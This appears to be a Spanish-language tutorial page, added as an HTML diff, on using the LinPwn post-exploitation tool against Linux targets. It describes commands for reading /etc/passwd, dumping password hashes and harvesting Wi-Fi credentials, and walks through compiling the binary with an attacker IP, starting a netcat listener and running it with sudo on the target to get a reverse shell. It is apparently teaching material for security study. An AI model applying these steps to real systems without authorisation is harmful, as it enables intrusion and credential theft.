@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>51 LinPwn</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+  </style>
+  <link rel="stylesheet" href="estilo.css" />
+</head>
+<body>
+<p><strong>LinPwn</strong></p>
+<p>El proyecto <strong>LinPwn</strong> es una herramienta interactiva de
+<strong>post-explotación</strong> diseñada para ayudar en la fase de
+enumeración y escalada de privilegios en sistemas Linux. Es útil una vez
+que ya se ha obtenido acceso inicial a una máquina objetivo.</p>
+<p><strong>1. Funcionalidad de LinPwn</strong></p>
+<p>LinPwn funciona como una utilidad que facilita la comunicación con
+una máquina comprometida y ofrece comandos internos para realizar tareas
+comunes de escalada de privilegios.</p>
+<p><strong>Características principales:</strong></p>
+<ul>
+<li><p><strong>Herramienta Interactiva:</strong> Ofrece una interfaz de
+línea de comandos propia que permite ejecutar comandos
+internos.</p></li>
+<li><p><strong>Post-Explotación:</strong> Su objetivo es la fase
+posterior a la explotación, centrada en descubrir información y
+conseguir un mayor nivel de acceso.</p></li>
+<li><p><strong>Conexión Shell Inversa:</strong> Está diseñado para
+establecer una conexión de <em>shell</em> inversa (reverse shell) desde
+la máquina objetivo (la víctima) hacia tu máquina atacante.</p></li>
+</ul>
+<p><strong>Comandos internos que ofrece LinPwn:</strong></p>
+<table>
+<colgroup>
+<col style="width: 15%" />
+<col style="width: 84%" />
+</colgroup>
+<thead>
+<tr>
+<th><strong>Comando</strong></th>
+<th><strong>Descripción</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>shell</td>
+<td>Ejecuta /bin/sh en el sistema objetivo, lo que te da una
+<em>shell</em> interactiva para ejecutar comandos.</td>
+</tr>
+<tr>
+<td>readfile</td>
+<td>Imprime el contenido de un archivo especificado (ej.:
+/etc/passwd).</td>
+</tr>
+<tr>
+<td>enumerate</td>
+<td>Ejecuta el script <strong>LinEnum.sh</strong> (una herramienta
+popular de enumeración de Linux) para recopilar una gran cantidad de
+información sobre el sistema.</td>
+</tr>
+<tr>
+<td>download</td>
+<td>Descarga un archivo en la máquina objetivo desde una URL
+específica.</td>
+</tr>
+<tr>
+<td>wificredz</td>
+<td>Intenta recopilar las contraseñas guardadas de Wi-Fi.</td>
+</tr>
+<tr>
+<td>hashdump</td>
+<td>Recopila los <em>hashes</em> de las contraseñas del sistema.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>2. Proceso de Instalación (Compilación)</strong></p>
+<p>LinPwn está escrito principalmente en <strong>C++</strong>, por lo
+que necesita ser <strong>compilado</strong> en código binario antes de
+poder usarse.</p>
+<p>El repositorio incluye un <em>script</em> de <em>shell</em> llamado
+build.sh para facilitar este proceso.</p>
+<p><strong>Paso 2.1: Clonar el Repositorio</strong></p>
+<p>Primero, necesitas clonar el código fuente en tu máquina de
+ataque:</p>
+<p>git clone https://github.com/Andromeda1957/LinPwn.git</p>
+<p>cd LinPwn</p>
+<p><strong>Paso 2.2: Compilar el Binario</strong></p>
+<p>El archivo build.sh es opcional, pero simplifica la compilación:</p>
+<ol type="1">
+<li><p><strong>Ejecuta el script de compilación:</strong></p></li>
+</ol>
+<blockquote>
+<p>bash build.sh</p>
+</blockquote>
+<ol start="2" type="1">
+<li><p>El <em>script</em> te mostrará las opciones de compilación
+disponibles y generará el archivo binario
+<strong>LinPwn</strong>.</p></li>
+</ol>
+<p><img src=".\\media\\51 LinPwn/media/image1.png"
+style="width:5.0007in;height:1.36477in" /></p>
+<p>bash build.sh --default</p>
+<p><img src=".\\media\\51 LinPwn/media/image2.png"
+style="width:5.90556in;height:3.38958in" /></p>
+<p><em>(Nota: Deberías tener un compilador de C++ como g++ instalado en
+tu sistema para que esto funcione. Si usas un sistema enfocado en
+seguridad como Kali Linux, ya lo tendrás).</em></p>
+<p><strong>3. Proceso de Ejecución Paso a Paso</strong></p>
+<p>Para usar LinPwn, debes configurar una conexión de <em>shell</em>
+inversa entre tu máquina (el atacante) y la máquina objetivo (donde se
+ejecutará LinPwn).</p>
+<p><strong>Paso 3.1: Configurar la Conexión en el Código
+(Pre-ejecución)</strong></p>
+<p><strong>Antes de compilar</strong>, debes editar el código fuente
+(LinPwn.cc) y establecer la dirección IP y el puerto al que quieres que
+se conecte el binario, dentro de la clase Connection.</p>
+<ol type="1">
+<li><p><strong>Edita el archivo LinPwn.cc</strong> y busca la clase o
+sección de <strong>Connection</strong>.</p></li>
+<li><p><strong>Establece tu IP y puerto</strong> de escucha.</p></li>
+<li><p>Vuelve al <strong>Paso 2.2</strong> para compilar el binario con
+tus datos de conexión.</p></li>
+</ol>
+<p><img src=".\\media\\51 LinPwn/media/image3.png"
+style="width:5.53202in;height:1.12516in" /></p>
+<p><img src=".\\media\\51 LinPwn/media/image4.png"
+style="width:5.04237in;height:0.72927in" /></p>
+<p><strong>Paso 3.2: Configurar el Oyente (Máquina
+Atacante)</strong></p>
+<p>En tu máquina de ataque (por ejemplo, Ubuntu), configura un oyente
+(listener) usando netcat (nc) en el puerto que configuraste en el código
+de LinPwn.</p>
+<p>nc -lvp PUERTO</p>
+<p>nc -lvp 4444</p>
+<p><img src=".\\media\\51 LinPwn/media/image5.png"
+style="width:4.78192in;height:1.44812in" /></p>
+<p><em>Reemplaza PUERTO con el número de puerto que definiste en el
+código (LinPwn.cc).</em></p>
+<p><strong>Paso 3.3: Ejecutar LinPwn (Máquina Objetivo)</strong></p>
+<p>Una vez que tengas el binario <strong>LinPwn</strong> en la máquina
+objetivo y tu oyente listo, ejecuta el binario en la máquina objetivo
+para establecer la conexión:</p>
+<p>chmod +x LinPwn</p>
+<p>sudo ./LinPwn</p>
+<p><img src=".\\media\\51 LinPwn/media/image6.png"
+style="width:5.90556in;height:1.44444in" /></p>
+<p><strong>Paso 3.4: Usar la Herramienta (Máquina Atacante)</strong></p>
+<p>Si la conexión se realiza con éxito, verás una <em>shell</em>
+interactiva en tu terminal (nc) con el <em>prompt</em> de LinPwn. Luego
+puedes empezar a ejecutar sus comandos internos:</p>
+<p><img src=".\\media\\51 LinPwn/media/image7.png"
+style="width:5.90556in;height:2.97292in" /></p>
+<p>(LinPwn) &gt; enumerate</p>
+<p><img src=".\\media\\51 LinPwn/media/image8.png"
+style="width:5.90556in;height:3.54306in" /></p>
+<p><strong>Para ejecutar comandos de la <em>shell</em> del
+sistema:</strong></p>
+<p>(LinPwn) &gt; shell</p>
+<p>(LinPwn: Shell) &gt; id</p>
+<p>(LinPwn: Shell) &gt; exit # Para volver al prompt de LinPwn</p>
+<p><img src=".\\media\\51 LinPwn/media/image9.png"
+style="width:5.90556in;height:1.23889in" /></p>
+<script src="nav.js"></script>
+</body>
+</html>
